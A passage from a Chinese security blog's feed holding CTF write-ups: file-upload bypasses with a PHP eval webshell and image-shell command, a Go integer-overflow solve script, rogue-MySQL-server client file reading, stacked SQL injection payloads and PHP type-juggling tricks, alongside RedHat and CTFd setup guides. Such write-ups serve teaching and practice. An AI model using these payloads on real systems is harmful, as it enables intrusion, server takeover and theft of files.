我们跟一跟php_stream_open_wrapper_ex就会发现，其实最后会使用tsrm_realpath函数来将filename给标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。 所以，如果我们传入的是文件名中包含一个不存在的路径，写入的时候因为会处理掉../等相对路径，所以不会出错；判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。 payload1： name=xxxxx/../1.php （这个方法是仅限Linux，因为Windows的文件操作API也会处理文件路径） payload2： name=1.php/.0x11.上传图片马cmd生成命令： copy a.jpg/b+a.php shell.jpg图片马上传成功后，若服务端存在文件包含漏洞，则(可能)可以被利用 一句话木马格式： &lt;?php @eval($_POST[&apos;cmd&apos;]); ?&gt;如果php版本小于7，还可用以下写法： &lt;script language=php&gt;@eval($_POST[&apos;cmd&apos;]);&lt;/script&gt; &lt;acript language=php&gt;system(&quot;ls&quot;);&lt;/script&gt;文件头检测在文件首部加上如下16进制数据，后面跟一句话木马即可 JFIF FF D8 FF E0 00 10 4A 46 49 46 GIF89a 47 49 46 38 39 61 PNG 89 50 4E 47二次渲染服务端会获取上传的图片信息，之后会通过这些信息来生成一个新的图片 情形： 详情参考https://xz.aliyun.com/t/2657#toc-13 GIF直接对比上传前后图像那些部分没有被渲染，在没有被渲染的地方插入木马即可 PNG JPG脚本保存为jpg_payload.php，再准备张图片，之后用cmd： php jpg_payload.php a.jpg0x12.Boundary尝试在boundary等号后加空格、使boundary边界不一致等在某些情况下可绕过waf 0x13.imagemagick邂逅getimagesize直接放上p牛的链接吧(目前难以读懂…)： https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html 参考链接：https://blog.csdn.net/xiaojianpitt/article/details/6856536https://xz.aliyun.com/t/2435http://phpstudy.php.cn/jishu-php-3234.htmlhttps://jingyan.baidu.com/article/3ea5148981f81752e61bba16.htmlhttps://www.cnblogs.com/cyjaysun/p/4390930.htmlhttp://wonderkun.cc/index.html/?p=626https://xz.aliyun.com/t/2657#toc-1https://xz.aliyun.com/t/337#toc-1 https://www.jianshu.com/p/aa08d99a98aa]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[go语言整数溢出]]></title>
    <url>%2F2019%2F06%2F10%2Fgo%E8%AF%AD%E8%A8%80%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[go语言是Google开发的一种静态强类型、编译型、并发型，并具有垃圾回收功能的编程语言 go整数溢出go语言的数据类型有：布尔型、数字类型、字符串类型、派生类型(指针类型、数组类型…)，我们着重看下数字类型 go有基于架构的类型，例如：int、uint 和 uintptr。 序号 类型和描述 1 uint8 无符号 8 位整型 (0 到 255) 2 uint16 无符号 16 位整型 (0 到 65535) 3 uint32 无符号 32 位整型 (0 到 4294967295) 4 uint64 无符号 64 位整型 (0 到 18446744073709551615) 5 int8 有符号 8 位整型 (-128 到 127) 6 int16 有符号 16 位整型 (-32768 到 32767) 7 int32 有符号 32 位整型 (-2147483648 到 2147483647) 8 int64 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807) 对于无符号的整型溢出： max + 1 = 0 max + 2 = 1 max + n = n -1 max * 2 = max - 1 max * 3 = max - 2 max * n = max - n 护网杯ltshop 要拿到flag，购买流程： 购买大辣条-》兑换辣条之王-》兑换flag但是初始金钱是固定的20；发现只有一个可控变量，即兑换辣条之王的数目，可以推测后台伪代码： 123456789101112131415161718uint64 number = input() //用户输入的兑换辣条之王的数字uint64 max = math.uint64max //无符号整型的最大值uint64 biglt = 6 //用户的大辣条包数，假如为6包uint64 kinglt = 0 //用户拥有的辣条之王if(number不是数字)&#123; error&#125;else if(number &gt; max)&#123; error&#125;else if( (biglt - 5 * number) &lt; 0 )&#123; print 买不起那么多&#125;else if( (biglt - 5 * number) &gt;= 0 )&#123; print 购买成功 biglt = biglt - 5 * number kinglt = number&#125; 1.首先要利用条件竞争，购买到的大辣条的个数要大于5，才能利用整数溢出来完成购买辣条之王 2.number不能超过max，不然会输出error，且number的值即为最后kinglt的值，因此number要大于9999999 且要让(biglt - 5 * number) &gt;= 0，才能进入到第三个条件语句： 5 * number &lt;= biglt 5 * number &lt;= 6 5 * number &lt;= max + 7 number &lt;= (max + 7)/5则让number = (max + 5)/5即可，此时 biglt = biglt - 5 * number = 6 - (max + 5) = 6 - 4 = 2 kinglt = number = (max + 5)/5ddctf大吉大利,今晚吃鸡~ 创建订单，发现要2000才能购买 在创建订单的时候进行抓包，发现请求： GET /ctf/api/buy_ticket?ticket_price=2000则不断尝试整数溢出，后来发现是uint32整数溢出，则将2000改为4294967295 + 1，那么在购买的时候会花费max + 1，即0 需要淘汰掉100人，需要输入礼包的id和ticket_id才能淘汰掉一个人 方法一.先注册100个小号，再用大号一个个淘汰掉用这种写脚本的方法，有以下需要注意的： 1.在注册和登录的账号和密码都是以get请求发出的2.登录成功后返回了bill_id，购买时参数需要附加这个bill_id 1234567891011121314151617181920212223242526272829303132333435363738import requests, jsong = requests.session()headers = &#123; 'Cookie': 'user_name=abcdgtf; REVEL_SESSION=641e2f6738230859394160c7085814b6'&#125;for i in range(100, 800): s = requests.session() register = 'http://117.51.147.155:5050/ctf/api/register?name=gggv' + '&#123;&#125;'.format(i) + '&amp;password=123456789' #print(register) login = 'http://117.51.147.155:5050/ctf/api/login?name=gggv' + '&#123;&#125;'.format(i) + '&amp;password=123456789' create_bill = 'http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296' buy = 'http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=' # 购买门票 print(s.get(register).text) print(s.get(login).text) bill_number = s.get(create_bill).text bill_number = json.loads(bill_number) print(bill_number) bill_number = bill_number['data'][0]['bill_id'] buy_bill = buy + str(bill_number) #print(buy_bill) res = s.get(buy_bill).text # 购买，返回礼包id和ticket_id res = json.loads(res) #print(res) your_id = res['data'][0]['your_id'] your_ticket = res['data'][0]['your_ticket'] remove = 'http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;'.format(your_id, your_ticket) print(g.get(remove, headers=headers).text) 参考链接：https://evoa.me/index.php/archives/4/]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透测试]]></title>
    <url>%2F2019%2F06%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[信息收集拿到webshell之前1.旁站、C段查询：http://webscan.cc/2.whois查询：http://whois.chinaz.com/3.网站架构探测：http://www.yunsee.cn/info.html4.目录扫描工具：https://github.com/H4ckForJob/dirmap5.layer子域名挖掘机 相关概念： whois：就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商） 旁站：是和目标网站在同一台服务器上的其它的网站。 C段：是和目标服务器ip处在同一个网段的其它服务器。 拿到webshell之后查看当前权限： whoami查看主机版本： cat /etc/issue]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL LOAD DATA 任意读取客户端文件]]></title>
    <url>%2F2019%2F06%2F07%2FMySQL-LOAD-DATA-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[原理看着模模糊糊的···详见：https://xz.aliyun.com/t/3973#toc-0 利用场景：题目存在远程连接MySQL功能 相关题目：国赛全宇宙最简单的SQL，ddctfmysql弱口令 模拟服务器端脚本：https://github.com/allyshka/Rogue-MySql-Server 读取服务器端文件测试环境：windows10，phpstudy 想要使用LOAD DATA INFILE，服务器配置必须启用该功能。默认是启动的，也可以在连接时使用–enable-local-infile来开启该功能 开始测试失败，报错： ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement原因是secure-file-priv参数做了限制 secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。 secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出 secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下，此时如果读写发生在其他文件夹，就会报出以上错误 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制 打开 phpstudy的其他选项菜单-打开配置文件-mysql-ini，找到secure_file_priv，则把文件放到对应的目录下就能进行LOAD DATA INFILE操作;在C:/datas/pass.txt中写入123456 mysql&gt; load data infile &apos;C:/datas/pass.txt&apos; into table test1.users1 fields terminated by &apos;,&apos;; Query OK, 1 row affected, 2 warnings (0.06 sec) Records: 1 Deleted: 0 Skipped: 0 Warnings: 2可以看到文件的数据被成功读取到表中的id字段下： mysql&gt; select * from test1.users1; +--------+----------+----------+ | id | username | password | +--------+----------+----------+ | 1 | fff | asdf | | 2 | ddd | dfasdf | | 123456 | | | +--------+----------+----------+ 3 rows in set (0.00 sec)读取客户端文件流程： 攻击者向受害者提供MySQL服务器地址、账户、密码 受害者向攻击者提供的服务器发起请求，并尝试进行身份认证 攻击者的MySQL接受到受害者的连接请求，攻击者发送正常的问候、身份验证正确，并且向受害者的MySQL客户端请求文件。 受害者的MySQL客户端认为身份验证正确，执行攻击者的发来的请求，通过LOAD DATA INLINE 功能将文件内容发送回攻击者的MySQL服务器。 攻击者收到受害者服务器上的信息，读取文件成功，攻击完成。 测试环境：windows10，phpstudy，阿里云ubuntu16.04服务器 1.在windows10新建文件C:/datas/pass.txt，在里面写入： 之后修改脚本，将读取路径改为： filelist = ( C:/datas/pass.txt )2.登录云服务器，然后运行： python rogue_mysql_server.py查看当前开放端口(如果已存在3306端口，则需要编辑脚本，更改端口号后再运行)： netstat -antp 根据端口配置阿里云安全组配置 3.运行phpstudy，打开WWW\phpMyAdmin\librariesconfig.default.php，修改 $cfg[&apos;AllowArbitraryServer&apos;] = true; //false改为true之后在浏览器打开phpMyAdmin登录页面，输入ip和端口，账号密码随便填，连接到模拟的MySQL服务器端： 4.此时，在服务器端cat mysql.log，即可看到读取的客户端的文件内容了： 相关扩展 phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库 要使用phpMyAdmin，首先需要在服务器(ubuntu16.04)上安装MySQL，并设置远程访问： 1.首先需要在服务器上安装MySQL(安装过程中需要设置密码)： apt-get install mysql-server apt install mysql-client apt install libmysqlclient-dev2.找到MySQL配置文件： vi /etc/mysql/mysql.conf.d/mysqld.cnf注释掉bind-address = 127.0.0.1 3.用设置的密码(xxxxxx)登录MySQL： mysql -uroot -pxxxxxx输入： GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;xxxxxx&apos; WITH GRANT OPTION;继续输入： flush privileges;4.重启MySQL服务： systemctl restart mysql即可用phpMyAdmin进行远程连接，管理MySQL数据库 DDCTF mysql弱口令题目说明： 部署agent.py再进行扫描哦~ 本题不需要使用扫描器 限制了每秒2－3次访问点开链接后，发现是一个扫描页面： 没有部署agent.py时，输入服务器ip和3306端口会提示连接超时；查看agent.py文件，发现其运行时会开放8123端口，扫描器会连接这个端口并会通过netstat -tlnp来检查端口开放情况 打开agent.py，将下面这句注释掉 self.wfile.write(json.dumps(result))在下方添加： print json.dumps(result)运行可以看到输出了服务器的所有内网端口和进程名称 部署agent.py后，输入服务器的ip和3306端口，发现提示服务器未开启mysql，但此时服务器是开启MySQL的服务还有3306端口的 则可以推测扫描器会检测agent.py的self.wfile是否含有进程mysqld 则将下面这句注释掉 self.wfile.write(json.dumps(result))在下面添加： self.wfile.write(&apos;mysqld&apos;)这样即可绕过检测；之后，再编辑rogue_mysql_server.py，将端口设为3306，运行后，在扫描器扫描，发现扫描到了服务器存在弱口令 之后改变rogue_mysql_server.py读取的文件路径；最后一步考察的是对linux系统目录的掌握，有以下方法： 方法一root用户的mysql操作一般记录在：~/.mysql_history中，读取一下就可以拿到flag 方法二查看bash历史操作： cat ~/.bash_history得到了程序的入口文件： 那么查看/home/dc2-user/ctf_web_2/app/main/views.py内容，得到提示： # flag in mysql curl@localhost database:security table:flag那么查看securiy数据库的flag表的内容： /var/lib/mysql/security/flag.ibd即可得到flag 参考链接：http://aq.mk/index.php/archives/23/https://xz.aliyun.com/t/3973#toc-0https://blog.csdn.net/itxiaolong3/article/details/77905923https://blog.csdn.net/dillanzhou/article/details/82876575http://blog.chinaunix.net/uid-22666248-id-3040364.htmlhttps://xz.aliyun.com/t/4887#toc-7]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL注入过滤(二)]]></title>
    <url>%2F2019%2F06%2F07%2FSQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[最近这段时间参加了一些比赛，碰到些SQL注入的题，但自己以前没有碰到这些类型的。。。最后都没有做出来，现在总结一下 堆叠注入强网杯随便注 过滤关键词： preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);不能通过union注入来注入，但可以进行堆叠注入： 1.查看当前数据库的表： 1&apos;;show tables;#得到： array(1) { [0]=&gt; string(16) &quot;1919810931114514&quot; } array(1) { [0]=&gt; string(5) &quot;words&quot; }2.查看表”1919810931114514”的结构： 1&apos;;desc `1919810931114514`;#得到： array(6) { [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(12) &quot;varchar(100)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot; }3.查看表”words”的表结构： 1&apos;;desc words;#得到： array(6) { [0]=&gt; string(2) &quot;id&quot; [1]=&gt; string(7) &quot;int(10)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot; } array(6) { [0]=&gt; string(4) &quot;data&quot; [1]=&gt; string(11) &quot;varchar(20)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot; }方法一.更改表名列名可以得出，这个web程序默认显示的内容是查询表words的data列的结果： select * from words where id=&apos;&apos;;则将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了(注意，1919810931114514表中不存在id列，则可以将flag列名字改为id) payload： 1&apos;;alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#分开来看： 1&apos;; alter table words rename to words1; alter table `1919810931114514` rename to words; alter table words change flag id varchar(50); #最后，查看表中所有数据即可： 1&apos;or 1=1# 相关MySQL语法： 1.重命名表名(将表名user改为users)： alter table user rename to users;2.重命名列名(将字段名username改为name)： alter table users change uesrname name varchar(30);方法二.使用预处理语句直接查询1&apos;;set @sql=concat(&apos;selec&apos;,&apos;t * from `1919810931114514`;&apos;);prepare s from @sql;execute s;deallocate prepare s;#发现行不通： strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)但strstr这个函数并不能区分大小写，因此使用大写即可绕过： 1&apos;;Set @sql=concat(&apos;selec&apos;,&apos;t * from `1919810931114514`;&apos;);Prepare s from @sql;execute s;deallocate prepare s;#即： 1&apos;; Set @sql=concat(&apos;selec&apos;,&apos;t * from `1919810931114514`;#&apos;); Prepare s from @sql; execute s; deallocate prepare s; # 相关MySQL预处理语句语法： 1.set用于设置变量名和值 2.prepare用于预备一个语句，并赋予名称，以后可以引用该语句 3.execute执行语句 4.deallocate prepare用来释放掉预处理的语句 盲注过滤条件语句、延迟函数国赛全宇宙最简单的SQL 过滤： |、or、sleep、if、benchmark、case注入回显特点： 1.SQL语法正确的话，如果账号密码不对，会显示 登陆失败 2.SQL语法不正确的话，会显示 数据库操作失败 利用逻辑运算符和溢出报错来进行注入，pow(999,999)这个表达式的值在mysql中超出double范围，会报错；当盲注结果为真时，就会执行到溢出语句报错数据库操作失败，盲注结果为假时，就不会执行溢出语句，从而显示登录失败： mysql&gt; select 1 and 1=1 and pow(999,999); ERROR 1690 (22003): DOUBLE value is out of range in &apos;pow(999,999)&apos; mysql&gt; select 1 and 1=0 and pow(999,999); +----------------------------+ | 1 and 1=0 and pow(999,999) | +----------------------------+ | 0 | +----------------------------+ 1 row in set (0.00 sec)在不知道mysql列名的情况下注入国赛全宇宙最简单的SQL 过滤了or，则不能从information.schema表中获取信息，表名和列名猜解出username和password，但password含有or，不能通过这个列名查询出信息，可以利用以下技巧： users1表： mysql&gt; select * from users1; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | fff | asdf | | 2 | ddd | dfasdf | +----+----------+----------+ 2 rows in set (0.07 sec)替换列名： mysql&gt; select 1,2,3 union select * from users1; +---+-----+--------+ | 1 | 2 | 3 | +---+-----+--------+ | 1 | 2 | 3 | | 1 | fff | asdf | | 2 | ddd | dfasdf | +---+-----+--------+ 3 rows in set (0.03 sec)根据自己定义的列名查询数据： mysql&gt; select `2` from (select 1,2,3 union select * from users1)as a; +-----+ | 2 | +-----+ | 2 | | fff | | ddd | +-----+ 3 rows in set (0.00 sec) 参考链接： https://xz.aliyun.com/t/4904https://www.ctfwp.com/articals/2019national.html#%E5%85%A8%E5%AE%87%E5%AE%99%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84sqlhttps://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485809&amp;idx=1&amp;sn=5bde7da3fb89627829e037d2df960e7b&amp;chksm=e89e21a9dfe9a8bf6cde9b14462193f5865a8ad78d75e77fb567717447a837cc189e42d41e27&amp;mpshare=1&amp;scene=23&amp;srcid=#rd]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RedHat7服务器配置]]></title>
    <url>%2F2019%2F06%2F06%2FRedHat7%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[记录这学期学的一些RedHat上的dhcp、dns、web服务器的配置 dhcp1.由于虚拟机也提供了dhcp服务，因此用nat或host-only时会选用虚拟机的dhcp服务，因此要在虚拟网络编辑器中取消分配dhcp 2.移除virbr0虚拟网卡；https://blog.csdn.net/csdn_immortal/article/details/81068259 3.配置静态ip，要与dhcp子网在同一网段； vi /etc/sysconfig/network-scripts/ifcfg-eno16777736修改内容： BOOTPROTO=static IPADDR=192.168.2.5 GATEWAY=192.168.2.14.配置dhcp vi /etc/dhcp/dhcpd.conf修改后内容如下： ddns-update-style interim; ignore client-updates; subnet 192.168.2.0 netmask 255.255.255.0 { # --- default gateway option routers 192.168.2.1; option subnet-mask 255.255.255.0; range dynamic-bootp 192.168.2.50 192.168.2.60; default-lease-time 21600; max-lease-time 43200; } 5.开始用service dhcpd start启动dhcp，但出现Redirecting to /bin/systemctl start dhcpd.service; 改用systemctl start dhcpd.service启动dhcp服务 用systemctl status dhcpd.service查看服务状态 用netstat -unlp查看dhcp监听端口： 67/udp 服务端 68/udp 客户端6.客户机重新获取ip； dns主配置文件：vi /etc/named.conf配置过后内容： [root@localhost named]# cat /etc/named.conf options { directory &quot;/var/named&quot;; }; zone &quot;.&quot; IN { type hint; file &quot;named.ca&quot;; }; zone &quot;localhost&quot; IN { type master; file &quot;named.localhost&quot;; }; zone &quot;0.0.127.in-addr-arpa&quot; IN { type master; file &quot;named.loopback&quot;; }; zone &quot;gtf.com&quot; IN { type master; file &quot;gtf.com.zone&quot;; };检测语法是否出错： named-checkconf在主配置文件中配置域：区域格式： zone &quot;ZONE NAME&quot; IN { type {master|slave|hint|forward}; };主区域： file &quot;区域数据文件&quot;;从区域： file &quot;区域数据文件&quot; masters {主DNS服务器地址;};根区域(固定)： zone &quot;.&quot; IN { type hint; file &quot;named.ca&quot;; };建立区域文件建立正向区域(要与上面主配置文件的配置域中的区域数据文件名相同)： cd /var/named/ vi gtf.com.zone检测语法错误： named-checkzone &quot;gtf.com&quot; /var/named/gtf.com.zone配置过后内容： [root@localhost named]# cat gtf.com.zone $TTL 600 gtf.com. IN SOA test.gtf.com. admin.gtf.com. ( 2019052519 10800 3600 604800 463500 ) @ IN NS test.gtf.com. test IN A 192.168.2.8 www IN CNAME test.gtf.com.配置该文件需要更改权限： chomd 640 gtf.com.zone启动dns启动dns服务： systemctl start named.service查看dns服务状态： systemctl status named.service查看53端口是否打开 netstat -antlpe | grep named 验证配置[root@localhost named]# host test.gtf.com test.gtf.com has address 192.168.2.8在其他主机上测试，需指定dns服务器地址： vi /etc/resolv.conf nameserver 192.168.2.5web主配置文件： vi /etc/httpd/conf/httpd.conf配置的内容： Listen 80 Include conf.modules.d/*.conf User apache Group apache ServerAdmin root@sh.com ServerName test.gtf.com:80 DocumentRoot &quot;/var/www/html&quot; DirectoryIndex index.html index.htm AddDefaultCharset UTF-8之后在/var/www/html目录下创建index.html写入内容后，即可访问http://192.168.2.5来访问这个web服务(192.168.2.5是我虚拟机的静态ip地址) 之后修改/var/named/gtf.com.zone，将test对应的ip地址修改为虚拟机的ip地址，即可通过test.gtf.com`来访问web服务]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04-CTFd平台搭建]]></title>
    <url>%2F2019%2F06%2F05%2FUbuntu16-04-CTFd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[配置环境：阿里云服务器ubuntu 16.04，python3 欢迎来平台玩~http://ctf.dropsec.xyz 下载CTFd下载git： apt-get install git克隆： git clone https://github.com/CTFd/CTFd安装配置虚拟环境、python包下载pip apt-get install python3-pip安装virtualenv: apt install python-virtualenv安装virtualenvwrapper，方便管理虚拟环境： pip3 install virtualenvwrapper vim ~/.bashrc在最后(shift+g)添加 export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3 # 虚拟环境存储的目录 export WORKON_HOME=$HOME/.virtualenvs source /usr/local/bin/virtualenvwrapper.sh再 source ~/.bashrc用回官方的源，执行命令 vim ~/.pip/pip.conf把配置信息都注释掉，让pip用回默认的官方源。 创建Python3环境，执行命令， mkvirtualenv --python=/usr/bin/pyhton3 环境名查看虚拟环境： workon使用虚拟环境： workon 环境名称退出虚拟环境： deactivate安装所需的包： cd CTFd python3 -m pip install -r requirements.txt 启动Flaskcd CTFd ./prepare.sh python3 serve.py可在本地 curl 127.0.0.1:4000查看启动是否成功 安装gunicornpip install gunicorn启动服务： cd /var/www/CTFd gunicorn --bind 0.0.0.0:4000 -w 5 &quot;CTFd:create_app()&quot;表示绑定端口号4000,有5个进程来处理请求 使用gunicorn启动服务，公网访问响应很慢 配置nginx1.安装 apt-get install nginx启动nginx： systemctl start nginx2.配置 vi /etc/nginx/sites-available/default配置内容： server{ listen 90; # 端口不冲突就行，稍后映射此端口即可在公网用此端口访问服务 server_name x.x.x.x # 填你服务器的ip charset utf-8; client_max_body_size 75M; root /var/www/CTFd; # 这里写CTFd平台的根目录,取决于个人具体情况 location / { proxy_pass http://localhost:4000; # 转发到本地的这个端口，这个是gunicorn开放的端口 } location /static { root /var/www/CTfd/CTFd/themes/core/static/; # 静态文件走这边，nginx自己处理静态文件贼快 } }启动服务启动守护进程gunicorn: nohup gunicorn --bind 0.0.0.0:4000 -w 5 &quot;CTFd:create_app()&quot; &amp;启动nginx： systemctl start nginx即可在公网的90端口访问自己的服务 运行后你可以通过查看当前文件下的nohup.out文件来查看运行状况 端口占用若启动失败，可能端口正被占用 1.查看端口及软件 netstat -antp2.杀掉进程 kill 进程号更换主题将主题文件放到/CTFd/theme下，之后用管理员账号登录，在Config选项中切换主题即可；主题更换后，nginx的配置文件中配置的static路径也要更改 优化发现请求的时候总是有个访问/static/user.css的404错误，解决方法： 找到CTFd/CTFd下的views.py文件，将下面的代码注释掉： @views.route(&quot;/static/user.css&quot;) def custom_css(): &quot;&quot;&quot; Custom CSS Handler route :return: &quot;&quot;&quot; return Response(get_config(&quot;css&quot;), mimetype=&quot;text/css&quot;)在打开主题文件，这里是theme/hacker-theme/templates，找到base.html，搜索views.custom_css，将下面这一行删除掉即可 &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;{{ url_for('views.custom_css') }}&quot;&gt; 测试的时候有的访问链接端口老是被重定向到80端口出错，最后发现是nginx文件配置有冲突，在这里感谢朴俊杰学长的耐心教导！！！ 参考链接： apache及php下载https://blog.csdn.net/weixin_42878826/article/details/81451668 阿里云端口映射 https://blog.csdn.net/CC1991_/article/details/84944602使用nginx+gunicorn http://www.xalex.cn/blog/Typecho/index.php/archives/33/ 配置nginx https://www.andseclab.com/2018/07/23/nginxtornadoflaskctfd的网站搭建]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019-ISCC wp]]></title>
    <url>%2F2019%2F05%2F18%2F2019-ISCC%20wp%2F</url>
    <content type="text"><![CDATA[记录misc部分和web部分的解题思路 隐藏的信息题目描述： 这是一个被混淆的文件，但是我忘记了这个文件的密码。你能够帮助我还原明文吗？ 0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113 一堆数字，且每个数字都不大于8，推测是8进制，写脚本转换即可： 12345678strs = open('message.txt', 'r').read()li = strs.split(' ')for i in li: if i != '': i = int(i, 8) print(chr(i),end='') 得出的字符串再base64解码即可 最危险的地方就是最安全的地方下载文件后，将jpg图片foremost分离，得到一堆二维码和一个压缩包，压缩包解压后还是一堆二维码；用微微二维码批量解码： 发现有个图片扫描后为+10086，其他感觉这些数据没有关联 找到这个图片，发现除了这个图片，其它全为png格式；用010editor打开： 发现这段数据为base64编码，将其解码得到flag前半部分，继续往下找，发现： 这里写着flag… 解密成绩单题目描述： 老师为了保密将某门课程的成绩单进行了加密处理，但在查成绩时忘记了自己原来是怎样进行了加密，你能帮同学们顺利查到成绩吗？ 下载后是一个zip文件，不过需要密码，查看文件属性没有相关信息，则想到了zip伪加密： 压缩源文件目录区： 50 4B 01 02：目录中文件头标记 3F 00：压缩使用的 pkware 版本 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记，将其改为其它的数字就会产生伪加密找到压缩文件目录区(14 00 后面的)，将全局方式标记09 08改为00 00 ，保存解压后得到一个exe文件，让输入账号和密码，但不知道，想到了用IDA，里面有个check username 和 check password的函数，直接点开就显示了用户名admin和密码：ISCCq19pc1Yhb6SqtGhliYH688feCH7lqQxtfa2MpOdONW1wmIleBo4TW5n 在exe中输入即可 Welcome题目描述： 流浪地球计划中拟采取新的文字加密方式，你能破译这个简单的文件吗？ 下载得到一个名为zip的文件，用010editor打开，发现文件头标志为zip的标志，则将文件后缀改为zip，解压 到在线简体字繁体字转换网站转换http://www.aies.cn/m/，部分内容如下： 流浪计划 桃离木星户口 苌条户口 苌条流浪计划 桃离木星流浪计划 桃离木星户口 苌条户口 苌条流浪计划 桃离木星流浪计划 桃离木星户口 苌条户口 苌条流浪计划 桃离木星户口 苌条户口 苌条流浪计划 桃离木星流浪计划 桃离木星流浪计划 桃离木星户口 苌条户口 苌条流浪计划 桃离木星流发现这些字符串由流浪计划 逃离木星 户口 长条组成，将流浪计划 逃离木星替换为0，将户口 长条替换为1，得到： 011001100110110001100001011001110111101101001001010100110100001101000011010111110101011101000101010011000100001101001111010011010100010101111101转ascii字符即可 倒立屋web1源码： 1234567891011121314151617&lt;?phperror_reporting(0);require 'flag.php';$value = $_GET['value'];$password = $_GET['password'];$username = '';for ($i = 0; $i &lt; count($value); ++$i) &#123; if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == 'w3lc0me_To_ISCC2019' &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123; echo 'Hello '.$username.'!', '&lt;br&gt;', PHP_EOL; echo $flag, '&lt;hr&gt;'; &#125;&#125;highlight_file(__FILE__); 1.参数value为数组，数组中的元素值不能在32-127之间，且chr(value)要为字符 在PHP Mannual上，提到了chr函数的参数： An integer between 0 and 255. Values outside the valid range (0..255) will be bitwise and’ed with 255, which is equivalent to the following algorithm: while ($bytevalue &lt; 0) { $bytevalue += 256; } $bytevalue %= 256; 则传入的数字为负数或者大于256即可 生成payload： 12345678910111213string = 'value[]='change = 'w3lc0me_To_ISCC2019'payload = ''for i in change: i = ord(i) i = int(i) + 256 i = string + str(i) + '&amp;' payload += iprint(payload) 2.intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333 可以用PHP浮点数绕过(鬼知道这是什么原理)： password=2332.9999999999999还可以用16进制绕过： password = &apos;0x91d&apos;因为字符串开头为0，intval后返回0，小于2333；进行+1运算时会被当成16进制，自动转换为10进制后进行运算，从而大于2333 web2让破解三位数字密码，但是有验证码；可以将PHPSESSID和验证码置空，这样请求时服务器会认为这是第一次请求，就不会在SESSION中存储验证码，$imgcode != $_SESSION[&#39;code&#39;]就不成立(弱类型漏洞，$imgcode为’’，$_SESSION[‘code’]为NULL)，从而只判断用户名和密码是否正确 web3二次注入：攻击者构造的恶意数据存储在数据库后，当程序调用恶意数据执行SQL查询时，就发生了SQL二次注入 此题注入发生在注册以及重置密码的时候；注册代码： if (isset($_POST[&apos;submit&apos;])) { $username= mysql_escape_string($_POST[&apos;username&apos;]) ; $pass= mysql_escape_string($_POST[&apos;password&apos;]); $re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]); echo 